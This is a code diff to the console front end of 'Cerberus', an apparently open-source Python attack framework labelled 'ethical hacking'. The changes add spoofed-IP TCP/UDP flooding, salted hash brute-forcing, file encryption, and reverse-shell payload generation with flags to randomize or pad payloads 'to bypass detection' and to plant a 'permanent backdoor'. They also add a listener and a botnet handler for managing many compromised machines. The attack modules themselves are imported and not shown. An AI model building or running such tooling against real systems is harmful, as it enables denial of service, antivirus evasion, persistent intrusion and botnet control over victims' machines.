@@ -5,7 +5,6 @@ import itertools
 import hashlib
 import string
 import socket
-import random
 import time
 import sys
 import os
@@ -22,40 +21,57 @@ except:
 
 console = "default"
 
+colorama.init()
+
 def load_cerberus():
-
-    if os.name == 'posix': os.system('clear')
-    else:  os.system('cls')
-
-    colorama.init()
-
+    
     logo = """\033[31m
 
 
- ██████╗███████╗██████╗ ██████╗ ███████╗██████╗ ██╗   ██╗███████╗
-██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗██║   ██║██╔════╝
-██║     █████╗  ██████╔╝██████╔╝█████╗  ██████╔╝██║   ██║███████╗
-██║     ██╔══╝  ██╔══██╗██╔══██╗██╔══╝  ██╔══██╗██║   ██║╚════██║
-╚██████╗███████╗██║  ██║██████╔╝███████╗██║  ██║╚██████╔╝███████║
- ╚═════╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
+          _     
+        /\ \    
+       /  \ \   
+      / /\ \ \  
+     / / /\ \ \ 
+    / / /  \ \_\\
+   / / /    \/_/
+  / / /         
+ / / /________  
+/ / /_________\\
+\/____________/
 
 
     \033[39m"""
 
     for line in logo.split("\n"):
-        print(" " * 10 + line)
+        print(" " * 12 + line)
 
-    print("- DDoS, Exploitation and Post-Exploitation Framework\n\n\n")
+    print(f"\033[36m     - - = [\033[33m  Cerberus v1.3.0  \033[36m] = - -\n\033[39m")
+
+    print(f"\033[36m         < +-------------------+ >\033[39m")
+    print(f"\033[36m           |\033[31m      ETHICAL      \033[36m|\033[39m")
+    print(f"\033[36m           |\033[31m                   \033[36m|\033[39m")
+    print(f"\033[36m           |\033[31m      HACKING      \033[36m|\033[39m")
+    print(f"\033[36m           |\033[31m                   \033[36m|\033[39m")
+    print(f"\033[36m           |\033[31m     FRAMEWORK     \033[36m|\033[39m")
+    print(f"\033[36m         < +-------------------+ >\033[39m")
+
+    print(f"\n\033[36m author: \033[33mGilbert Enevoldsen\033[39m")
+    print(f"\033[36m github: \033[33mhttps://github.com/GilbertEnevoldsen/Cerberus\033[39m\n\n\n")
 
 load_cerberus()
 
 # Functions
+
+import global_variables
 
 from flood import *
 from scanner import *
 from cracker import *
 from payloads import *
 from listen import *
+from botnet_handler import *
+from encrypter import *
 
 # Console
 
@@ -63,7 +79,10 @@ while True:
 
     if console == "default":
 
-        command = input("Cerberus/\033[34mConsole\033[39m>").split(' ')
+        print(f"\033[34m Cerberus (\033[36m-\033[34m) -> \033[33m", end="")
+        command = input().split(' ')
+        
+        print("\033[39m", end="")
 
         if command[0] == "help":
             
@@ -71,105 +90,148 @@ while True:
                 
                 if command[1] == "flood":
                     
-                    print("usage: flood [-source <source ip>] [-target <target ip>] [-port <port>]")
-                    print("             [-masked <masked ip>] [-threads <threads>]")
                     print()
-                    print(".....source   ip address of the source machine")
-                    print(".....target   ip address of target machine")
-                    print(".......port   port to send packets through")
-                    print(".....masked   ip address to spoof packets from")
-                    print("....threads   number of threads (if left blank threads are not used)")
+                    print(" COMMAND USAGE")
+                    print(" =============")
+                    print(" flood [-target <target ip>] [-port <port>] [-spoof <spoofed ip>]")
+                    print("       [-delay <delay>] [-method <method>] [-threads <threads>]")
+                    print("       [-duration <duration>]")
+                    print()
+                    print(" ARGUMENTS")
+                    print(" =========")
+                    print(" target       ip address of target machine")
+                    print(" port         port to send packets through")
+                    print(" spoof        ip address to spoof packets from")
+                    print(" delay        delay between packets")
+                    print(" method       packet method")
+                    print("              tcp udp")
+                    print(" threads      number of threads")
+                    print(" duration     duration of the attack")
                     print()
 
                 if command[1] == "scan":
                     
-                    print("usage: scan [-target <source ip>]")
                     print()
-                    print("....target   ip address of the target machine")
+                    print(" COMMAND USAGE")
+                    print(" =============")
+                    print(" scan [-target <target ip>]")
+                    print()
+                    print(" ARGUMENTS")
+                    print(" =========")
+                    print(" target     ip address of the target machine")
                     print()
                 
                 if command[1] == "crack":
                     
-                    print("usage: crack [-password <source ip>] [-file <file>] [-algorithm <hashing alogrithm>]")
-                    print("             [-wordlist <wordlist file>] [-out <path>]")
                     print()
-                    print(".....password   hashed password to crack")
-                    print(".........file   file with hashed passwords")
-                    print("....algorithm   hashing algorithm used to hash the passwords")
-                    print("                sha1")
-                    print("                sha224")
-                    print("                sha256")
-                    print("                sha384")
-                    print("                sha512")
-                    print("                blake2b")
-                    print("                blake2s")
-                    print("                md5")
-                    print(".....wordlist   list of plain passwords to use to crack")
-                    print("..........out   output path")
+                    print(" COMMAND USAGE")
+                    print(" =============")
+                    print(" crack [-password <hash>] [-file <file>] [-presalt <salt>]")
+                    print("       [-sufsalt <salt>] [-iterations <iterations>] [-algorithm <hashing alogrithm>]")
+                    print("       [-charpool <charpool>] [-wordlist <wordlist file>] [-out <path>]")
+                    print()
+                    print(" ARGUMENTS")
+                    print(" =========")
+                    print(" password       hashed password to crack")
+                    print(" file           file with hashed passwords")
+                    print(" presalt        prefix salt")
+                    print(" sufsalt        suffix salt")
+                    print(" iterations     how many times the algorithm will be iterated")
+                    print(" algorithm      hashing algorithm used to hash the passwords")
+                    print("                sha1 sha224 sha256 sha384 sha512 blake2b blake2s md5")
+                    print(" charpool       characters to try bruteforcing with")
+                    print("                if not defined it will use lowercase, uppercase, digits, special characters")
+                    print(" wordlist       list of plain passwords to use to crack")
+                    print(" out            output path")
+                    print()
+
+                if command[1] == "encrypt":
+                    
+                    print()
+                    print(" COMMAND USAGE")
+                    print(" =============")
+                    print(" encrypt [-file <file>] [-key <key>]")
+                    print()
+                    print(" ARGUMENTS")
+                    print(" =========")
+                    print(" file     file to encrypt / decrypt")
+                    print(" key      32 character key")
+                    print("          encrypt an encrypted file with the same key and it gets decrypted")
+                    print("          if no key specified a key will be generated")
                     print()
             
             else:
 
-                print(".......help   displays functionality and usage of every command")
-                print(".......exit   exits the program")
-                print("......clear   clears the screen")
-                print("......flood   floods an address with packets")
-                print(".......scan   scans an address for open ports")
-                print("......crack   bruteforceses hashed passwords")
-                print("....exploit   puts console into exploit mode")
+                print()
+                print(" COMMAND      DESCRIPTION")
+                print(" =======      ===========")
+                print(" help         displays functionality and usage of every command")
+                print("              you can use help <command> to get information on some commands")
+                print(" exit         exits the program")
+                print(" clear        clears the screen")
+                print(" flood        floods an address with packets")
+                print(" scan         scans an address for open ports")
+                print(" crack        bruteforceses hashed passwords")
+                print(" encrypt      encrypt / decrypt a file with symmetric encryption")
+                print(" exploit      puts console into exploit mode")
                 print()
 
         if command[0] == "exit":
-
-            if os.name == 'posix': os.system('clear')
-            else:  os.system('cls')
 
             break
 
         if command[0] == "clear":
 
-            load_cerberus()
+            if os.name == 'posix': os.system('clear')
+            else:  os.system('cls')
+            print()
         
         if command[0] == "flood":
             
             try:
 
-                source = command[command.index("-source") + 1]
                 target = command[command.index("-target") + 1]
                 port = int(command[command.index("-port") + 1])
-                masked = command[command.index("-masked") + 1]
+                spoof = command[command.index("-spoof") + 1]
+                delay = int(command[command.index("-delay") + 1])
+                method = command[command.index("-method") + 1]
+                duration = int(command[command.index("-duration") + 1])
 
-                number_of_threads = 0
+                number_of_threads = 1
 
-                if '-threads' in command:
+                global_variables.request_index = 0
+                global_variables.attack_running = True
+
+                if "-threads" in command:
                     number_of_threads = int(command[command.index("-threads") + 1])
 
-                print("\033[36m[*] flooding\033[39m")
+                print("\033[36m [*] flooding\033[39m")
 
-                number_of_requests = 0
+                for thread_index in range(number_of_threads):
+
+                    try:
+                        
+                        thread = threading.Thread(target=flood, args=[target, port, spoof, delay, method])
+                        thread.start()
+                        
+                    except:
+                        
+                        pass
+
+                time.sleep(duration)
+
+                global_variables.attack_running = False
                 
-                if number_of_threads <= 0:
+                thread.join()
 
-                    flood(source, target, port, masked)
-                    print("\033[31m\n[!] session quit unexpectedly\033[39m\n")
-
-                else:
-
-                    for _ in range(number_of_threads):
-
-                        try:
-                            
-                            thread = threading.Thread(target=flood, args=[source, target, port, masked])
-                            thread.start()
-                            thread.join()
-                            
-                        except:
-                            
-                            pass
+                print(f"\n finished with {global_variables.request_index} requests made")
+                print()
                         
             except:
                 
-                print("\033[31m\n[!] command error\033[39m\n")
+                print("\033[31m\n [!] command error\033[39m\n")
+            
+            
                     
         if command[0] == "scan":
         
@@ -178,25 +240,34 @@ while True:
                 target = command[command.index("-target") + 1]
         
                 scan_address(target)
-                    
+        
             except:
                 
-                print("\033[31m\n[!] command error\033[39m\n")
+                print("\033[31m\n [!] command error\033[39m\n")
         
         if command[0] == "crack":
             
             try:
+                
+                presalt = ""
+                sufsalt = ""
+                iterations = 1
+                charpool = None
         
                 if "-password" in command: password = command[command.index("-password") + 1]
                 else: file = command[command.index("-file") + 1]
+                if "-presalt" in command: presalt = command[command.index("-presalt") + 1]
+                if "-sufsalt" in command: sufsalt = command[command.index("-sufsalt") + 1]
+                if "-iterations" in command: iterations = command[command.index("-iterations") + 1]
                 algorithm = command[command.index("-algorithm") + 1]
+                if "-charpool" in command: charpool = command[command.index("-charpool") + 1]
                 if "-wordlist" in command: wordlist = command[command.index("-wordlist") + 1]
                 if "-out" in command: out = command[command.index("-out") + 1]
                 
                 if "-password" in command:
-                    
+
                     passwords = [password]
-                    
+
                 else:
                     
                     with open(file, 'r') as file: passwords = file.read().split("\n")
@@ -209,12 +280,22 @@ while True:
                     
                 if not "-out" in command: out = None
                 
-                crack(passwords, algorithm, wordlist, out)
-                print()
-                    
-            except:
+                crack(passwords, presalt, sufsalt, iterations, algorithm, charpool, wordlist, out)
                 
-                print("\033[31m\n[!] command error\033[39m\n")
+                print()
+
+            except:
+
+                print("\033[31m\n [!] command error\033[39m\n")
+
+        if command[0] == "encrypt":
+            
+            key = None
+            
+            file = command[command.index("-file") + 1]
+            if "-key" in command: key = command[command.index("-key") + 1]
+            
+            encrypt(file, key)
 
         if command[0] == "exploit":
 
@@ -223,7 +304,10 @@ while True:
         
     if console == "exploit":
 
-        command = input("Cerberus/\033[31mExploit\033[39m>").split(' ')
+        print(f"\033[34m Cerberus (\033[31mExploit\033[34m) -> \033[33m", end="")
+        command = input().split(' ')
+        
+        print("\033[39m", end="")
 
         if command[0] == "help":
             
@@ -231,61 +315,98 @@ while True:
                 
                 if command[1] == "payload":
                     
-                    print("usage: payload [-host <host ip>] [-port <port>]")
-                    print("               [-out <path>]")
                     print()
-                    print("....host   ip address of the host machine")
-                    print("....port   port to open connection")
-                    print(".....out   output path")
+                    print(" COMMAND USAGE")
+                    print(" =============")
+                    print(" payload [-host <host ip>] [-port <port>] [-random]")
+                    print("         [-junk <bytes>] [-persistance] [-out <path>]")
+                    print()
+                    print(" ARGUMENTS")
+                    print(" =========")
+                    print(" host            ip address of the host machine")
+                    print(" port            port to open connection")
+                    print(" random          randomizes the payload to bypass detection")
+                    print(" junk            adds junk data to increase size to bypass detection")
+                    print(" persistance     automaticly creates a permanent backdoor")
+                    print(" out             output path")
                     print()
                 
                 if command[1] == "listen":
                     
-                    print("usage: payload [-host <host ip>] [-port <port>]")
                     print()
-                    print("....host   ip address of the host machine")
-                    print("....port   port which to listen for connections")
+                    print(" COMMAND USAGE")
+                    print(" =============")
+                    print(" payload [-host <host ip>] [-port <port>]")
+                    print()
+                    print(" ARGUMENTS")
+                    print(" =========")
+                    print(" host          ip address of the host machine")
+                    print(" port          port which to listen for connections")
+                    print()
+                
+                if command[1] == "botnet":
+                    
+                    print()
+                    print(" COMMAND USAGE")
+                    print(" =============")
+                    print(" botnet [-host <host ip>] [-port <port>]")
+                    print()
+                    print(" ARGUMENTS")
+                    print(" =========")
+                    print(" host     ip address of the host machine")
+                    print(" port     port which to listen for connections")
                     print()
             
             else:
 
-                print(".......help   displays functionality and usage of every command")
-                print(".......exit   exits the program")
-                print("......clear   clears the screen")
-                print("....payload   generates a payload")
-                print(".....listen   listens for incoming connections")
-                print(".......back   returns console to normal mode")
+                print()
+                print(" COMMAND     DESCRIPTION")
+                print(" =======     ===========")
+                print(" help        displays functionality and usage of every command")
+                print("             you can use help <command> to get information on some commands")
+                print(" exit        exits the program")
+                print(" clear       clears the screen")
+                print(" payload     generates a payload")
+                print(" listen      listens for incoming reverse shell connections")
+                print(" botnet      allows for multiple reverse shell handling")
+                print(" back        returns console to normal mode")
                 print()
 
         if command[0] == "exit":
-
-            if os.name == 'posix': os.system('clear')
-            else:  os.system('cls')
 
             break
         
         if command[0] == "clear":
 
-            load_cerberus()
+            if os.name == 'posix': os.system('clear')
+            else:  os.system('cls')
+            print()
             
         if command[0] == "payload":
-            
+
             try:
-            
+
+                randomize = False
+                junk = 0
+                persistance = False
+
                 host = command[command.index("-host") + 1]
                 port = command[command.index("-port") + 1]
+                if "-random" in command: randomize = True
+                if "-junk" in command: junk = int(command[command.index("-junk") + 1])
+                if "-persistance" in command: persistance = True
                 out = command[command.index("-out") + 1]
-                
-                print("\033[36m[*] generating payload\033[39m")
-                    
-                generate_shell_payload(host, port, out)
-                
-                print("\033[36m[*] payload generated\033[39m")
+
+                print("\033[36m [*] generating payload\033[39m")
+
+                generate_shell_payload(host, port, randomize, junk, persistance, out)
+
+                print("\033[36m [*] payload generated\033[39m")
                 print()
             
             except:
                 
-                print("\033[31m\n[!] command error\033[39m\n")
+                print("\033[31m\n [!] command error\033[39m\n")
         
         if command[0] == "listen":
             
@@ -294,13 +415,20 @@ while True:
                 host = command[command.index("-host") + 1]
                 port = int(command[command.index("-port") + 1])
                 
-                print("\033[36m[*] listening for connections\033[39m")
+                print("\033[36m [*] listening for connections\033[39m")
                 
                 listen_for_connections(host, port)
                     
             except:
                 
-                print("\033[31m\n[!] command error\033[39m\n")
+                print("\033[31m [!] command error\033[39m\n")
+        
+        if command[0] == "botnet":
+            
+            host = command[command.index("-host") + 1]
+            port = int(command[command.index("-port") + 1])
+            
+            botnet_handler(host, port)
         
         if command[0] == "back":
 
